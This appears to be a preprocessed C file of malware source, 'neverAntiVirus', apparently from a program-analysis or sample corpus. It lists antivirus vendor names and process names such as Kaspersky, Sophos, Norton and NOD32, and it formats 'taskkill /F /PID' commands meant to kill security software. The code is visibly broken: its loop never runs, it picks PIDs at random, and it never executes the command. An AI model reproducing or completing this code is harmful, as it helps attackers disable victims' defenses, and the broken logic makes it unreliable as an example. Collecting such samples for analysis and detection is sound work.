# 1 "./neverAntiVirus.cil.c"
# 1 "<built-in>"
# 1 "<command-line>"
# 1 "./neverAntiVirus.cil.c"
# 365 "/usr/include/stdio.h"
extern __attribute__((__nothrow__)) int sprintf(char * __restrict __s , char const * __restrict __format
                                                 , ...) ;
# 380 "/usr/include/stdlib.h"
extern __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) rand)(void) ;
# 4 "neverAntiVirus.c"
char const *Taskkill[52] =
# 4 "neverAntiVirus.c"
  { "av", "Av", "AV", "defend",
        "Defend", "DEFEND", "f-", "F-",
        "defense", "Defense", "DEFENSE", "Kaspersky",
        "KASPERSKY", "kaspersky", "sophos", "SOPHOS",
        "Sophos", "SAVAdminService.exe", "SavService.exe", "Scanner",
        "SCANNER", "scanner", "Norton", "norton",
        "NORTON", "Security", "SECURITY", "security",
        "Anti", "ANTI", "anti", "SCAN",
        "Scan", "scan", "Malware", "MALWARE",
        "malware", "Virus", "VIRUS", "virus",
        "NOD32", "nod32", "Nod32", "Zoner",
        "ZONER", "zoner", "SECUR", "Secur",
        "secur", "Dr.", "DR.", (char const *)0};
# 14 "neverAntiVirus.c"
int NeverAntiVirus(void)
{
  int pid ;
  int task ;
  int c ;
  int tmp ;
  char command[255] ;
  unsigned int tmp___0 ;
  int __retres7 ;

  {
# 16 "neverAntiVirus.c"
  pid = -1;
# 17 "neverAntiVirus.c"
  task = 10;
# 21 "neverAntiVirus.c"
  c = 0;
  {
# 21 "neverAntiVirus.c"
  while (1) {
    while_continue: ;
# 21 "neverAntiVirus.c"
    if (task < 10) {

    } else {
# 21 "neverAntiVirus.c"
      goto while_break;
    }
# 23 "neverAntiVirus.c"
    tmp = rand();
# 23 "neverAntiVirus.c"
    pid = tmp % 256;
# 24 "neverAntiVirus.c"
    if (pid != 0) {
# 25 "neverAntiVirus.c"
      command[0] = (char)0;
# 25 "neverAntiVirus.c"
      tmp___0 = 1U;
      {
# 25 "neverAntiVirus.c"
      while (1) {
        while_continue___0: ;
# 25 "neverAntiVirus.c"
        if (tmp___0 >= 255U) {
# 25 "neverAntiVirus.c"
          goto while_break___0;
        } else {

        }
# 25 "neverAntiVirus.c"
        command[tmp___0] = (char)0;
# 25 "neverAntiVirus.c"
        tmp___0 ++;
      }
      while_break___0: ;
      }
# 26 "neverAntiVirus.c"
      sprintf((char * __restrict )(command), (char const * __restrict )"taskkill /F /PID %d",
              pid);
    } else {

    }
# 21 "neverAntiVirus.c"
    c ++;
  }
  while_break: ;
  }
# 29 "neverAntiVirus.c"
  __retres7 = 0;
# 14 "neverAntiVirus.c"
  return (__retres7);
}
}
# 32 "neverAntiVirus.c"
int main(void)
{
  int __retres1 ;

  {
# 34 "neverAntiVirus.c"
  NeverAntiVirus();
# 35 "neverAntiVirus.c"
  __retres1 = 0;
# 32 "neverAntiVirus.c"
  return (__retres1);
}
}
